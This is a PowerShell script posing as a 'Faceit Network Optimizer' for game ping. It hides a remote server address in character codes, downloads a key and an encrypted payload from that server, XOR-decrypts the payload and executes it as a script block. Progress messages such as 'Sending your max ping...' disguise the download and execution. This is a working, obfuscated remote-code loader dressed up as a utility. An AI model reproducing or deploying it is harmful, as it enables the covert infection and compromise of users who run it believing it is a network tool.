# Faceit Network Optimizer - True Orange Edition

# Принудительная установка кодировки консоли для поддержки Unicode
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

function Show-Progress {
    param([string]$Activity, [int]$Percent)
    Write-Progress -Activity $Activity -PercentComplete $Percent
}

Clear-Host

# Логотип с серой рамкой и оранжевым текстом
$header = @"
          ╔══════════════════════════════════════════════╗
            ███████╗ █████╗  ██████╗███████╗██╗████████╗
            ██╔════╝██╔══██╗██╔════╝██╔════╝██║╚══██╔══╝
            █████╗  ███████║██║     █████╗  ██║   ██║   
            ██╔══╝  ██╔══██║██║     ██╔══╝  ██║   ██║   
            ██║     ██║  ██║╚██████╗███████╗██║   ██║   
            ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝   ╚═╝   
                     NETWORK OPTIMIZER
          ╚══════════════════════════════════════════════╝
"@

# Вывод логотипа
$header.Split("`n") | ForEach-Object {
    $line = $_
    if ($line -match "[╔╚║╗╝]") {
        Write-Host $line -ForegroundColor DarkGray
    } elseif ($line.Trim() -ne "") {
        Write-Host $line -ForegroundColor DarkYellow
    }
}
Write-Host ""

# Запрос пинга
Write-Host -NoNewline "  Enter max ping (ms): " -ForegroundColor DarkYellow
$ping = Read-Host
Write-Host ""

Show-Progress -Activity "Connecting to server..." -Percent 20

$sUllz = 'http://' + 
             [char]55+[char]52+'.'+[char]49+[char]49+[char]57+'.'+
             [char]49+[char]57+[char]50+'.'+[char]50+[char]50+[char]52+':5000'

try {

    Show-Progress -Activity "Requesting optimizer..." -Percent 30
    $key = Invoke-RestMethod "$sUllz/.key" -TimeoutSec 20
    

    Show-Progress -Activity "Sending your max ping..." -Percent 50
    $encrypted = Invoke-RestMethod "$sUllz/loader.ps1" -TimeoutSec 20

    Show-Progress -Activity "Getting settings for optimizer..." -Percent 70
    
    $z = [Convert]::FromBase64String($encrypted)
    $w = [Text.Encoding]::UTF8.GetBytes($key)
    $r = New-Object byte[] $z.Length
    
    for($j = 0; $j -lt $z.Length; $j++) {
        $r[$j] = $z[$j] -bxor $w[$j % $w.Length]
        
        if($j % 1000 -eq 0) {
            $percent = 70 + (($j / $z.Length) * 20)
            Show-Progress -Activity "Reading your settings..." -Percent $percent
        }
    }
    
    Show-Progress -Activity "Launching optimizer..." -Percent 95
    Start-Sleep -Milliseconds 300
    
    Write-Progress -Activity "Complete" -Completed
    
    Write-Host "  [✓] Optimizer launched successfully" -ForegroundColor Green
    Write-Host "  [*] Please wait for completion..." -ForegroundColor Yellow
    Write-Host ""
    Write-Host "  ═════════════════════════════════════════════════════════" -ForegroundColor DarkGray
    Write-Host ""

    $global:MaxPing = $ping
    
    $scriptContent = [Text.Encoding]::UTF8.GetString($r)
    $scriptBlock = [scriptblock]::Create($scriptContent)
    
    try {
        & $scriptBlock
        Write-Host ""
        Write-Host "  [✓] Optimization complete!" -ForegroundColor Green
    } catch {
        Write-Host ""
        Write-Host "  [✗] Optimization error: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    Write-Host ""
    Write-Host "  Press any key to exit..." -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    
} catch {
    Write-Progress -Activity "Error" -Completed
    Write-Host ""
    Write-Host "  [✗] Failed: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host ""
    Write-Host "  Press any key to exit..." -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}
